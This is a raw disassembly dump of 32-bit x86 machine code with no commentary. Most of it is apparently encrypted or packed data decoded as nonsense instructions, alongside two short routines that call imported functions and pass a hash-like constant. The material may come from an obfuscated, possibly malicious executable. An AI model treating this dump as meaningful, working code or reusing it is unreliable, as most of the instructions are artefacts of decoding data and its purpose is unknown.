  422c56:	pop    ebx
  422c57:	mov    DWORD PTR [ecx-0x1e2b7909],esp
  422c5d:	xor    eax,DWORD PTR ds:0x6bfee9a4
  422c63:	mov    eax,0x6fe40c35
  422c68:	clc    
  422c69:	das    
  422c6a:	pop    ecx
  422c6b:	rcl    DWORD PTR [edx],cl
  422c6d:	adc    eax,0xadba94de
  422c72:	stos   BYTE PTR es:[edi],al
  422c73:	mov    cl,0x20
  422c75:	jp     0x422cab
  422c77:	jle    0x422c34
  422c79:	mov    cx,0xa5ff
  422c7d:	xchg   ecx,eax
  422c7e:	mov    ds:0xcc7ef440,eax
  422c83:	xchg   edi,eax
  422c84:	xchg   DWORD PTR ss:[eax],edx
  422c87:	shr    ebp,1
  422c89:	iret   
  422c8a:	mov    ah,0xf9
  422c8c:	mov    ebx,0x7322b280
  422c91:	aad    0xf7
  422c93:	add    al,0x87
  422c95:	xchg   edi,eax
  422c96:	scas   al,BYTE PTR es:[edi]
  422c97:	mov    ebx,0xcbb41788
  422c9c:	les    ebx,FWORD PTR [ecx]
  422c9e:	fcomp  DWORD PTR [esi+0x1588091a]
  422ca4:	xchg   ebx,eax
  422ca5:	add    al,al
  422ca7:	inc    ebp
  422ca8:	jmp    0x422cac
  422caa:	sbb    ch,BYTE PTR [edx-0x3]
  422cad:	pop    es
  422cae:	xor    edi,DWORD PTR [ebx+0x52]
  422cb1:	inc    ecx
  422cb2:	xchg   esi,eax
  422cb3:	loopne 0x422c97
  422cb5:	jo     0x422c58
  422cb7:	ficomp WORD PTR [ebp-0x702b0ed1]
  422cbd:	push   ebx
  422cbe:	fcmovb st,st(6)
  422cc0:	mov    edx,0xa6e927a1
  422cc5:	xor    eax,0x7bf59bc4
  422cca:	push   ss
  422ccb:	fadd   QWORD PTR [ebx+0x73]
  422cce:	mov    al,ds:0x3c7d57a7
  422cd3:	scas   al,BYTE PTR es:[edi]
  422cd4:	hlt    
  422cd5:	test   BYTE PTR [ebx],dl
  422cd7:	xlat   BYTE PTR ds:[ebx]
  422cd8:	test   BYTE PTR [eax-0x22],bl
  422cdb:	mov    esp,DWORD PTR [ecx+0x4ccaecac]
  422ce1:	xchg   ebx,eax
  422ce2:	inc    esp
  422ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ce4:	sub    al,0x47
  422ce6:	mov    edx,0xaffb94e0
  422ceb:	shr    DWORD PTR [ecx-0x72],1
  422cee:	or     DWORD PTR [eax],esp
  422cf0:	xchg   esi,eax
  422cf1:	jmp    0x44c5:0x4d910ef9
  422cf8:	(bad)  
  422cf9:	xchg   esp,eax
  422cfa:	lahf   
  422cfb:	dec    ebx
  422cfc:	mov    ds,WORD PTR [eax+0x616596d5]
  422d02:	sar    DWORD PTR [esi],1
  422d04:	inc    DWORD PTR [esi+0x663dc597]
  422d0a:	dec    edi
  422d0b:	outs   dx,BYTE PTR ds:[esi]
  422d0c:	xchg   esp,eax
  422d0d:	jnp    0x422ca4
  422d0f:	dec    esp
  422d10:	push   edi
  422d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d12:	sahf   
  422d13:	cmp    al,0x48
  422d15:	mov    eax,0x57cffe1a
  422d1a:	cdq    
  422d1b:	dec    ecx
  422d1c:	test   DWORD PTR [eax+0x526f0291],0x548d46fe
  422d26:	add    eax,0xcaeee6c0
  422d2b:	jbe    0x422d65
  422d2d:	ins    DWORD PTR es:[edi],dx
  422d2e:	cmp    al,0x1d
  422d30:	(bad)
  422d34:	les    esp,FWORD PTR [eax-0x1fc0131f]
  422d3a:	mov    cl,0xff
  422d3c:	out    0xa1,al
  422d3e:	shr    BYTE PTR [ecx+0x30],0x84
  422d42:	pop    eax
  422d43:	lea    ecx,[edx-0x39]
  422d46:	leave  
  422d47:	jb     0x422d55
  422d49:	ret    
  422d4a:	inc    ebx
  422d4b:	xor    al,0x66
  422d4d:	pop    es
  422d4e:	imul   edi,DWORD PTR [edx+0x16],0xffffff97
  422d52:	mov    ebp,0xa9ce1d83
  422d57:	cmc    
  422d58:	repz loopne 0x422d27
  422d5b:	imul   ebx,DWORD PTR [eax],0x73
  422d5e:	pop    ss
  422d5f:	jae    0x422d35
  422d61:	mov    edx,0x3b9117a6
  422d66:	jne    0x422d7c
  422d68:	pop    esp
  422d69:	push   ecx
  422d6a:	repnz (bad) 
  422d6c:	add    dh,dl
  422d6e:	or     edx,0xffffffce
  422d71:	sbb    ebp,DWORD PTR [ecx]
  422d73:	jno    0x422d3c
  422d75:	je     0x422da1
  422d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d78:	ret    
  422d79:	cwde   
  422d7a:	das    
  422d7b:	enter  0xf186,0x9f
  422d7f:	pop    ecx
  422d80:	cs jnp 0x422dfe
  422d83:	je     0x422d7d
  422d85:	lods   eax,DWORD PTR ds:[esi]
  422d86:	jb     0x422dd6
  422d88:	in     al,0xef
  422d8a:	push   es
  422d8b:	sub    esi,ecx
  422d8d:	nop
  422d8e:	inc    ebp
  422d8f:	cmp    eax,0xc5a698d0
  422d94:	and    ah,BYTE PTR [ebx-0x7a]
  422d97:	push   ecx
  422d98:	loop   0x422dd8
  422d9a:	sbb    bl,al
  422d9c:	xor    DWORD PTR [ecx],edi
  422d9e:	xor    bl,ch
  422da0:	nop
  422da1:	jb     0x422d46
  422da3:	mov    edx,0x3f22518a
  422da8:	or     cl,BYTE PTR [eax]
  422daa:	int    0x88
  422dac:	push   ebp
  422dad:	adc    eax,0x958a6792
  422db2:	(bad)  [esi+0x7a]
  422db5:	ds mov edi,0x4ae9bcc1
  422dbb:	or     DWORD PTR [ebp-0x22fc9892],0x18
  422dc2:	mov    cl,0x90
  422dc4:	pop    es
  422dc5:	in     al,0xc1
  422dc7:	imul   esi,DWORD PTR [ecx-0x4b],0x60eb0cb0
  422dce:	push   ds
  422dcf:	repz and DWORD PTR [edx-0x5f],0xc15e39ea
  422dd7:	add    al,0x45
  422dd9:	sbb    DWORD PTR [edi],edx
  422ddb:	iret   
  422ddc:	jnp    0x422d60
  422dde:	dec    ebx
  422ddf:	or     eax,0x461c23f0
  422de4:	stos   DWORD PTR es:[edi],eax
  422de5:	test   ebx,edi
  422de7:	sub    BYTE PTR [edx+0x7d487bf2],0x82
  422dee:	and    ecx,DWORD PTR [edx-0x4a]
  422df1:	fstp   TBYTE PTR [ebp-0x63163142]
  422df7:	sbb    BYTE PTR cs:[ecx-0x3b],bl
  422dfb:	mov    al,0x45
  422dfd:	out    dx,eax
  422dfe:	add    DWORD PTR [edi],eax
  422e00:	inc    ebp
  422e01:	jmp    0x422e54
  422e03:	xor    eax,0x8da59a81
  422e08:	cdq    
  422e09:	pop    ecx
  422e0a:	outs   dx,DWORD PTR ds:[esi]
  422e0b:	addr16 inc ebp
  422e0d:	mov    ch,0xe1
  422e0f:	loope  0x422e56
  422e11:	or     dh,al
  422e13:	mov    ebp,0x98610845
  422e18:	xchg   edx,eax
  422e19:	sbb    ch,0x7d
  422e1c:	sub    BYTE PTR [ebp-0x5f],ch
  422e1f:	cdq    
  422e20:	mov    ebp,0x3b3c1c5b
  422e25:	mov    cl,0x7a
  422e27:	stos   DWORD PTR es:[edi],eax
  422e28:	xor    dl,ch
  422e2a:	fldcw  WORD PTR [ebx+0x5546dded]
  422e30:	popa   
  422e31:	arpl   WORD PTR [ebp+0x1fb7c456],cx
  422e37:	adc    al,BYTE PTR [esi+0x8]
  422e3a:	or     eax,0x69b94f98
  422e3f:	inc    esp
  422e40:	jge    0x422e23
  422e42:	mov    ds:0x3633b07c,eax
  422e47:	rol    DWORD PTR [esi-0x68f1a543],cl
  422e4d:	enter  0x1090,0x53
  422e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e52:	jp     0x422ec6
  422e54:	jge    0x422ec0
  422e56:	push   edx
  422e57:	mov    ds:0x438cf1ea,al
  422e5c:	mov    dl,0x82
  422e5e:	sub    ah,BYTE PTR [edx]
  422e60:	sub    ebx,edi
  422e62:	mov    ds:0x6072afef,al
  422e67:	mov    edi,0x5f93d69e
  422e6c:	shl    BYTE PTR [ebp-0x5b855391],1
  422e72:	push   edx
  422e73:	jle    0x422e4b
  422e75:	pop    ebx
  422e76:	push   ss
  422e77:	fild   WORD PTR [ecx]
  422e79:	xchg   ebp,eax
  422e7a:	xchg   ebp,eax
  422e7b:	sub    esp,DWORD PTR [ecx]
  422e7d:	mov    edi,0x27067704
  422e82:	jmp    0x440799b0
  422e87:	lods   al,BYTE PTR ds:[esi]
  422e88:	and    eax,0xba0c58
  422e8d:	adc    al,0xf
  422e8f:	(bad)  
  422e90:	sub    BYTE PTR [ebx+0xe],dl
  422e93:	int3   
  422e94:	bswap  esp
  422e96:	dec    edx
  422e97:	jecxz  0x422e30
  422e99:	lahf   
  422e9a:	rol    DWORD PTR [edi],0x5d
  422e9d:	dec    esi
  422e9e:	mov    al,0xde
  422ea0:	dec    ebx
  422ea1:	pushf  
  422ea2:	dec    edx
  422ea3:	sbb    al,0x63
  422ea5:	fwait
  422ea6:	cs gs adc edx,ecx
  422eaa:	repz or BYTE PTR [ebx],0xe1
  422eae:	popa   
  422eaf:	sub    dh,bl
  422eb1:	(bad)  
  422eb2:	adc    dl,bl
  422eb4:	arpl   bp,bp
  422eb6:	leave  
  422eb7:	mov    esi,DWORD PTR [ebx+ebx*2+0x18]
  422ebb:	mov    eax,ds:0x2a2abe64
  422ec0:	retf   
  422ec1:	ins    BYTE PTR es:[edi],dx
  422ec2:	lods   al,BYTE PTR ds:[esi]
  422ec3:	fimul  WORD PTR [esi-0x5f]
  422ec6:	and    eax,0xa5a18d32
  422ecb:	js     0x422f34
  422ecd:	stc    
  422ece:	dec    esp
  422ecf:	mov    bl,0xd2
  422ed1:	xor    al,0xc0
  422ed3:	in     eax,0x44
  422ed5:	ins    DWORD PTR es:[edi],dx
  422ed6:	int    0xbb
  422ed8:	inc    ebx
  422ed9:	(bad)  
  422eda:	push   ss
  422edb:	jns    0x422eee
  422edd:	pop    edi
  422ede:	mov    ebx,0x1f3f5e03
  422ee3:	ret    0xb128
  422ee6:	js     0x422e88
  422ee8:	xchg   BYTE PTR [edi+0xb707a30],bh
  422eee:	retf   
  422eef:	push   edi
  422ef0:	call   0xf305:0x696f0293
  422ef7:	test   eax,0xa1a75b17
  422efd:	xor    al,0xd5
  422eff:	add    bl,bl
  422f01:	push   0x349f01c8
  422f06:	iret   
  422f07:	push   ebx
  422f08:	and    bl,BYTE PTR [ebx+eiz*8+0x61]
  422f0c:	mov    esp,DWORD PTR [edx+eiz*2+0x361bc388]
  422f13:	mov    edx,0x637e3692
  422f18:	cmp    BYTE PTR [edi-0x2f4f3456],bl
  422f1e:	ret    
  422f1f:	test   BYTE PTR [esi-0x19571c0a],al
  422f25:	mov    dl,0x84
  422f27:	call   0x43e7f8
  422f2c:	add    BYTE PTR [eax],al
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0xb784d156
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	(bad)  
  422fd3:	cmp    DWORD PTR [ecx-0x689c72b2],edi
  422fd9:	fisttp QWORD PTR [edx+ecx*2+0x1dcf6e78]
  422fe0:	mov    esp,ebx
  422fe2:	fidiv  WORD PTR ds:0x8cdd9760
  422fe8:	dec    esi
  422fe9:	js     0x423059
  422feb:	(bad)  
  422fec:	loop   0x423062
  422fee:	jecxz  0x422fce
  422ff0:	lea    esp,[eax-0x69]
  422ff3:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  422ffa:	je     0x422fdf
  422ffc:	fimul  WORD PTR [ebp-0x732268a0]
  423002:	dec    esi
  423003:	js     0x423073
  423005:	iret   
  423006:	loop   0x42307c
  423008:	jecxz  0x422fe8
  42300a:	lea    esp,[eax-0x69]
  42300d:	fisttp QWORD PTR [esi+esi*4-0x13309188]
  423014:	imul   ebx,DWORD PTR [ecx-0x30],0xffffff8d
  423018:	aam    0x9e
  42301a:	adc    BYTE PTR [ebp+0x22279f6],ch
  423020:	ret    
  423021:	and    BYTE PTR [ebx-0x18bf0149],cl
  423027:	scas   eax,DWORD PTR es:[edi]
  423028:	jecxz  0x423053
  42302a:	or     cl,BYTE PTR [edi]
  42302c:	mov    ds:0xb08217c2,al
  423031:	jecxz  0x423042
  423033:	jecxz  0x423032
  423035:	out    dx,al
  423036:	sub    ebx,DWORD PTR [eax+0x1c]
  423039:	mov    edx,0xb08a548c
  42303e:	lods   eax,DWORD PTR ds:[esi]
  42303f:	and    al,0xd8
  423041:	mov    gs,WORD PTR [ebx+eiz*1-0x3355f5e9]
  423048:	jns    0x423038
  42304a:	aam    0xa9
  42304c:	pusha  
  42304d:	xchg   edi,eax
  42304e:	fisttp QWORD PTR [esi+ecx*2+0x7bc86e78]
  423055:	mov    BYTE PTR [edx-0x620d8a63],bh
  42305b:	sahf   
  42305c:	je     0x42303a
  42305e:	jb     0x42308d
  423060:	aaa    
  423061:	jo     0x4230e1
  423063:	mov    ebx,0xc86a81bb
  423068:	and    eax,0xb20441e
  42306d:	imul   eax
  42306f:	mov    dh,0x1b
  423071:	dec    esp
  423072:	xchg   DWORD PTR [eax],edi
  423074:	repnz in al,0x86
  423077:	es cmp ah,0xc5
  42307b:	into   
  42307c:	cli    
  42307d:	fcmovbe st,st(4)
  42307f:	retf   
  423080:	cwde   
  423081:	add    eax,0x69cec6d7
  423086:	test   DWORD PTR fs:[edx],ebx
  423089:	out    0xe9,al
  42308b:	xchg   esp,eax
  42308c:	or     eax,0x74859d61
  423091:	fdiv   QWORD PTR [edx+0x2d]
  423094:	aaa    
  423095:	jno    0x423115
  423097:	retf   
  423098:	daa    
  423099:	pop    ds
  42309a:	push   0x28
  42309c:	add    eax,0x9635440c
  4230a1:	pop    ebp
  4230a2:	call   0x8825b6d3
  4230a7:	push   0x16864f6f
  4230ac:	sbb    eax,0x8ca0c566
  4230b1:	jno    0x423087
  4230b3:	aad    0x5
  4230b5:	cwde   
  4230b6:	xlat   BYTE PTR ds:[ebx]
  4230b7:	into   
  4230b8:	mov    dh,0xea
  4230ba:	fs popf 
  4230bc:	mov    edx,DWORD PTR [edi]
  4230be:	mov    ebx,DWORD PTR [ebp-0x22620d8b]
  4230c4:	mov    WORD PTR [esi+0x78],cs
  4230c7:	outs   dx,BYTE PTR ds:[esi]
  4230c8:	iret   
  4230c9:	loop   0x42313f
  4230cb:	mov    bl,0x9b
  4230cd:	lea    esp,[eax-0x25]
  4230d0:	fmul   QWORD PTR [esi-0x6f726bb2]
  4230d6:	lods   eax,DWORD PTR ds:[esi]
  4230d7:	je     0x4230bc
  4230d9:	fimul  WORD PTR [ebp-0x732268a0]
  4230df:	scas   al,BYTE PTR es:[edi]
  4230e0:	js     0x42314f
  4230e2:	into   
  4230e3:	jmp    0x8e211a5d
  4230e8:	mov    WORD PTR [ebx+0x7e4a8cdd],ss
  4230ee:	outs   dx,BYTE PTR ds:[esi]
  4230ef:	iret   
  4230f0:	loop   0x423166
  4230f2:	jecxz  0x4230d3
  4230f4:	xor    BYTE PTR [eax-0x69],ah
  4230f7:	fstp   QWORD PTR [esi+ecx*2-0x18309188]
  4230fe:	je     0x4230e3
  423100:	fmulp  st(4),st
  423102:	pusha  
  423103:	xchg   edi,eax
  423104:	int    0x8c
  423106:	dec    esi
  423107:	js     0x423175
  423109:	iret   
  42310a:	loop   0x42317d
  42310c:	jecxz  0x4230ed
  42310e:	lea    esp,[eax-0x69]
  423111:	fisttp QWORD PTR [ebx+ecx*2-0x1d309088]
  423118:	je     0x4230fd
  42311a:	fimul  WORD PTR [ebp-0x73226320]
  423120:	dec    edx
  423121:	js     0x423191
  423123:	jb     0x4230f8
  423125:	jno    0x42310a
  423127:	fmul   QWORD PTR [ebp-0x7322e8a0]
  42312d:	pop    esi
  42312e:	js     0x42319e
  423130:	(bad)  
  423132:	je     0x423117
  423134:	ficomp WORD PTR [ebp-0x733268a0]
  42313a:	dec    esi
  42313b:	js     0x4231ab
  42313d:	iret   
  42313e:	loop   0x4231a4
  423140:	jecxz  0x423120
  423142:	lea    esp,[eax-0x69]
  423145:	fisttp QWORD PTR [esi+ecx*2+0x66cf6e78]
  42314c:	sbb    ch,al
  42314e:	fsubrp st(4),st
  423150:	arpl   WORD PTR [edi+0x737e8cdd],dx
  423156:	outs   dx,BYTE PTR ds:[esi]
  423157:	add    bh,bl
  423159:	je     0x42313e
  42315b:	fimul  WORD PTR [ebp-0x732268a0]
  423161:	dec    esi
  423162:	js     0x4231d2
  423164:	iret   
  423165:	loop   0x4231db
  423167:	jecxz  0x423147
  423169:	lea    esp,[eax-0x69]
  42316c:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  423173:	je     0x423158
  423175:	fimul  WORD PTR [ebp-0x732268a0]
  42317b:	dec    esi
  42317c:	js     0x4231ec
  42317e:	iret   
  42317f:	loop   0x4231f5
  423181:	jecxz  0x423161
  423183:	lea    esp,[eax-0x69]
  423186:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  42318d:	je     0x423172
  42318f:	fimul  WORD PTR [ebp-0x732268a0]
  423195:	dec    esi
  423196:	js     0x423206
  423198:	iret   
  423199:	loop   0x42320f
  42319b:	jecxz  0x42317b
  42319d:	lea    esp,[eax-0x69]
  4231a0:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  4231a7:	je     0x42318c
  4231a9:	fimul  WORD PTR [ebp-0x732268a0]
  4231af:	dec    esi
  4231b0:	js     0x423220
  4231b2:	iret   
  4231b3:	loop   0x423229
  4231b5:	jecxz  0x423195
  4231b7:	lea    esp,[eax-0x69]
  4231ba:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  4231c1:	je     0x4231a6
  4231c3:	lock stc 
  4231c5:	add    eax,0x4e8ca9ef
  4231ca:	js     0x42323a
  4231cc:	out    dx,eax
  4231cd:	jmp    0x8e111546
  4231d2:	pusha  
  4231d3:	xchg   edi,eax
  4231d4:	out    0x88,eax
  4231d6:	dec    esi
  4231d7:	js     0x423243
  4231d9:	iret   
  4231da:	loop   0x423200
  4231dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231dd:	popf   
  4231de:	mov    edi,0x8cddd834
  4231e3:	dec    esi
  4231e4:	js     0x423254
  4231e6:	iret   
  4231e7:	ret    0xe374
  4231ea:	mov    ds:0xefafe412,eax
  4231f0:	dec    esi
  4231f1:	js     0x423261
  4231f3:	iret   
  4231f4:	mov    dl,0x74
  4231f6:	jecxz  0x4231d6
  4231f8:	mov    ebp,0xdcdd976b
  4231fd:	dec    esi
  4231fe:	js     0x42326e
  423200:	icebp  
  423201:	out    0x74,al
  423203:	jecxz  0x4231e3
  423205:	lea    esp,[eax-0x69]
  423208:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  42320f:	push   esp
  423210:	jecxz  0x4231f0
  423212:	ins    DWORD PTR es:[edi],dx
  423213:	pusha  
  423214:	xchg   edi,eax
  423215:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  42321c:	je     0x423201
  42321e:	fimul  WORD PTR [ebp-0x732268a0]
  423224:	dec    esi
  423225:	js     0x423295
  423227:	iret   
  423228:	loop   0x42329e
  42322a:	jecxz  0x42320a
  42322c:	lea    esp,[eax-0x69]
  42322f:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  423236:	je     0x42321b
  423238:	fimul  WORD PTR [ebp-0x732268a0]
  42323e:	dec    esi
  42323f:	js     0x4232af
  423241:	iret   
  423242:	loop   0x4232b8
  423244:	jecxz  0x423224
  423246:	lea    esp,[eax-0x69]
  423249:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  423250:	je     0x423235
  423252:	fimul  WORD PTR [ebp-0x732268a0]
  423258:	dec    esi
  423259:	js     0x4232c9
  42325b:	iret   
  42325c:	loop   0x4232d2
  42325e:	jecxz  0x42323e
  423260:	lea    esp,[eax-0x69]
  423263:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  42326a:	je     0x42324f
  42326c:	fimul  WORD PTR [ebp-0x732268a0]
  423272:	dec    esi
  423273:	js     0x4232e3
  423275:	iret   
  423276:	loop   0x4232ec
  423278:	jecxz  0x423258
  42327a:	lea    esp,[eax-0x69]
  42327d:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  423284:	je     0x423269
  423286:	fimul  WORD PTR [ebp-0x732268a0]
  42328c:	dec    esi
  42328d:	js     0x4232fd
  42328f:	iret   
  423290:	loop   0x423306
  423292:	jecxz  0x423272
  423294:	lea    esp,[eax-0x69]
  423297:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  42329e:	je     0x423283
  4232a0:	fimul  WORD PTR [ebp-0x732268a0]
  4232a6:	dec    esi
  4232a7:	js     0x423317
  4232a9:	iret   
  4232aa:	loop   0x423320
  4232ac:	jecxz  0x42328c
  4232ae:	lea    esp,[eax-0x69]
  4232b1:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  4232b8:	je     0x42329d
  4232ba:	fimul  WORD PTR [ebp-0x732268a0]
  4232c0:	dec    esi
  4232c1:	js     0x423331
  4232c3:	iret   
  4232c4:	loop   0x42333a
  4232c6:	jecxz  0x4232a6
  4232c8:	lea    esp,[eax-0x69]
  4232cb:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  4232d2:	je     0x4232b7
  4232d4:	fimul  WORD PTR [ebp-0x732268a0]
  4232da:	dec    esi
  4232db:	js     0x42334b
  4232dd:	iret   
  4232de:	loop   0x423354
  4232e0:	jecxz  0x4232c0
  4232e2:	lea    esp,[eax-0x69]
  4232e5:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  4232ec:	je     0x4232d1
  4232ee:	fimul  WORD PTR [ebp-0x732268a0]
  4232f4:	dec    esi
  4232f5:	js     0x423365
  4232f7:	iret   
  4232f8:	loop   0x42336e
  4232fa:	jecxz  0x4232da
  4232fc:	lea    esp,[eax-0x69]
  4232ff:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  423306:	je     0x4232eb
  423308:	fimul  WORD PTR [ebp-0x732268a0]
  42330e:	dec    esi
  42330f:	js     0x42337f
  423311:	iret   
  423312:	loop   0x423388
  423314:	jecxz  0x4232f4
  423316:	lea    esp,[eax-0x69]
  423319:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  423320:	je     0x423305
  423322:	fimul  WORD PTR [ebp-0x732268a0]
  423328:	dec    esi
  423329:	js     0x423399
  42332b:	iret   
  42332c:	loop   0x4233a2
  42332e:	jecxz  0x42330e
  423330:	lea    esp,[eax-0x69]
  423333:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  42333a:	je     0x42331f
  42333c:	fimul  WORD PTR [ebp-0x732268a0]
  423342:	dec    esi
  423343:	js     0x4233b3
  423345:	iret   
  423346:	loop   0x4233bc
  423348:	jecxz  0x423328
  42334a:	lea    esp,[eax-0x69]
  42334d:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  423354:	je     0x423339
  423356:	fimul  WORD PTR [ebp-0x732268a0]
  42335c:	dec    esi
  42335d:	js     0x4233cd
  42335f:	iret   
  423360:	loop   0x4233d6
  423362:	jecxz  0x423342
  423364:	lea    esp,[eax-0x69]
  423367:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  42336e:	je     0x423353
  423370:	fimul  WORD PTR [ebp-0x732268a0]
  423376:	dec    esi
  423377:	js     0x4233e7
  423379:	iret   
  42337a:	loop   0x4233f0
  42337c:	jecxz  0x42335c
  42337e:	lea    esp,[eax-0x69]
  423381:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  423388:	je     0x42336d
  42338a:	fimul  WORD PTR [ebp-0x732268a0]
  423390:	dec    esi
  423391:	js     0x423401
  423393:	iret   
  423394:	loop   0x42340a
  423396:	jecxz  0x423376
  423398:	lea    esp,[eax-0x69]
  42339b:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  4233a2:	je     0x423387
  4233a4:	fimul  WORD PTR [ebp-0x732268a0]
  4233aa:	dec    esi
  4233ab:	js     0x42341b
  4233ad:	iret   
  4233ae:	loop   0x423424
  4233b0:	jecxz  0x423390
  4233b2:	lea    esp,[eax-0x69]
  4233b5:	fisttp QWORD PTR [esi+ecx*2-0x1d309188]
  4233bc:	je     0x4233a1
  4233be:	fimul  WORD PTR [ebp-0x732268a0]
  4233c4:	dec    esi
  4233c5:	js     0x423435
  4233c7:	iret   
  4233c8:	loop   0x42343e
  4233ca:	jecxz  0x4233aa
  4233cc:	lea    esp,[eax-0x69]
  4233cf:	fisttp QWORD PTR [esi+ecx*2-0x17ded688]
  4233d6:	je     0x4233a4
  4233d8:	fimul  WORD PTR [ebp-0x59226890]
  4233de:	in     al,dx
  4233df:	mov    ds:0x591da91f,al
  4233e4:	jge    0x42343f
  4233e6:	fisttp QWORD PTR [ebp-0x560ca5f]
  4233ec:	in     eax,dx
  4233ed:	or     BYTE PTR [esi+0x6ff02e66],bh
  4233f3:	cmp    dh,BYTE PTR [esi-0x6]
  4233f6:	cmp    DWORD PTR [esi],eax
  4233f8:	iret   
  4233f9:	mov    esi,0x4b72ad40
  4233fe:	(bad)  
  423400:	ret    0x80d1
  423403:	dec    DWORD PTR [ecx+ebp*2-0x4c651921]
  42340a:	sbb    DWORD PTR [edx-0x14],ecx
  42340d:	mov    al,0xbd
  42340f:	sub    DWORD PTR [esp+ebp*8+0x5e],0x23
  423414:	dec    eax
  423415:	fimul  WORD PTR ds:0x6ab2421d
  42341b:	fidivr DWORD PTR [ebx-0x79e5fee6]
  423421:	pop    eax
  423422:	mov    edi,0x7ee1ed2f
  423427:	inc    esp
  423428:	add    BYTE PTR fs:[ebx+esi*4+0x7e730d52],ah
  423430:	dec    esp
  423431:	mov    ds:0x2aca0678,eax
  423436:	fwait
  423437:	xchg   esp,eax
  423438:	and    DWORD PTR [edx],0xaac2e4c2
  42343e:	mov    al,BYTE PTR ds:0xf26ab029
  423444:	mov    edi,DWORD PTR [edx]
  423446:	(bad)  
  423447:	out    0xae,al
  423449:	scas   eax,DWORD PTR es:[edi]
  42344a:	xor    al,0x3f
  42344c:	mov    al,ds:0x47896f3a
  423451:	xchg   esi,eax
  423452:	setbe  BYTE PTR [ebx-0x32]
  423456:	retf   
  423457:	or     edi,edi
  423459:	jge    0x4233f5
  42345b:	outs   dx,DWORD PTR ds:[esi]
  42345c:	mov    bh,0xe5
  42345e:	dec    BYTE PTR [ebx-0x1141549d]
  423464:	xchg   DWORD PTR [esi],ebp
  423466:	stos   DWORD PTR es:[edi],eax
  423467:	loopne 0x423445
  423469:	jecxz  0x4234c6
  42346b:	sahf   
  42346c:	pop    eax
  42346d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42346e:	jp     0x4233f6
  423470:	adc    eax,0xf3b3b628
  423475:	stos   DWORD PTR es:[edi],eax
  423476:	cs and esi,esp
  423479:	icebp  
  42347a:	stos   BYTE PTR es:[edi],al
  42347b:	mov    ebx,0xeab24ad1
  423480:	sub    ah,0xa6
  423483:	shl    DWORD PTR [eax+0x32],1
  423486:	jno    0x42343f
  423488:	lahf   
  423489:	popf   
  42348a:	inc    ecx
  42348b:	sub    DWORD PTR [esi],ebp
  42348d:	mov    esi,ebx
  42348f:	out    0x64,eax
  423491:	ins    DWORD PTR es:[edi],dx
  423492:	push   ebx
  423493:	retf   
  423494:	enter  0x54e0,0x51
  423498:	adc    al,0x7d
  42349a:	gs ja  0x423421
  42349d:	mov    ch,0x59
  42349f:	jle    0x4234cc
  4234a1:	sahf   
  4234a2:	lods   al,BYTE PTR ds:[esi]
  4234a3:	jo     0x42350f
  4234a5:	shr    BYTE PTR [esi+0x54b1053b],0xa5
  4234ac:	xor    edi,ebp
  4234ae:	(bad)  
  4234af:	pop    ss
  4234b0:	jg     0x4234df
